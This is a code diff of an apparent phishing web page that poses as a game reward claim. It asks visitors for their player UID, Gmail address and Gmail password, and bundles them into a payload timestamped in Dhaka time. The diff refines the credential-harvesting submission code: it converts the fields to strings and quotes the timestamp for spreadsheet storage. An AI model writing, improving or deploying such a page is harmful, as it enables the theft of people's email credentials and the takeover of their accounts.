@@ -144,7 +144,6 @@
         }
         .btn-confirm:hover { background: #520b8a; }
 
-        /* Success Popup */
         #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
         .success-card { 
             background: var(--white); width: 88%; max-width: 360px; padding: 30px 20px; 
@@ -165,28 +164,24 @@
 <div class="container">
     <div class="header-title">Claim Your Reward</div>
 
-    <!-- Task 1: UID -->
     <div class="box">
         <label>1. Player UID</label>
         <input type="text" id="uid-input" placeholder="Enter Player UID">
         <span id="uid-error" class="error-msg"></span>
     </div>
 
-    <!-- Task 2: Gmail -->
     <div class="box">
         <label>2. Gmail Address</label>
         <input type="email" id="gmail-input" placeholder="Enter Gmail Address">
         <span id="gmail-error" class="error-msg"></span>
     </div>
 
-    <!-- Task 3: Password -->
     <div class="box">
         <label>3. Password</label>
         <input type="password" id="password-input" placeholder="Enter Password">
         <span id="password-error" class="error-msg"></span>
     </div>
 
-    <!-- Task 4: Choose Your Reward -->
     <div class="box">
         <label id="reward-label">4. Choose Your Reward (Locked 🔒)</label>
         <div class="reward-grid">
@@ -200,7 +195,6 @@
     <button class="btn-confirm" id="confirm-btn" onclick="submitData()">Confirm & Register</button>
 </div>
 
-<!-- Success Popup -->
 <div id="success-popup">
     <div class="success-card">
         <div class="success-icon">✓</div>
@@ -256,7 +250,7 @@
         }
         document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
         el.classList.add('active');
-        selectedRewardName = rewardName;
+        selectedRewardName = rewardname = rewardName;
         document.getElementById('reward-error').innerText = "";
     }
 
@@ -295,16 +289,18 @@
         confirmBtn.innerText = "SUBMITTING...";
         confirmBtn.disabled = true;
 
-        const now = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
+        // Time k string format a rakhar jonno '="' er moto ba string akare pathano hocche
+        const d = new Date();
+        const timeString = "'" + d.toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
 
         const payload = {
             data: [
                 {
-                    TIME: now,
-                    UID: uid,
-                    GMAIL: gmail,
-                    PASSWORD: password,
-                    REWARD: selectedRewardName,
+                    TIME: timeString,
+                    UID: String(uid),
+                    GMAIL: String(gmail),
+                    PASSWORD: String(password),
+                    REWARD: String(selectedRewardName),
                     STATUS: "Pending"
                 }
             ]
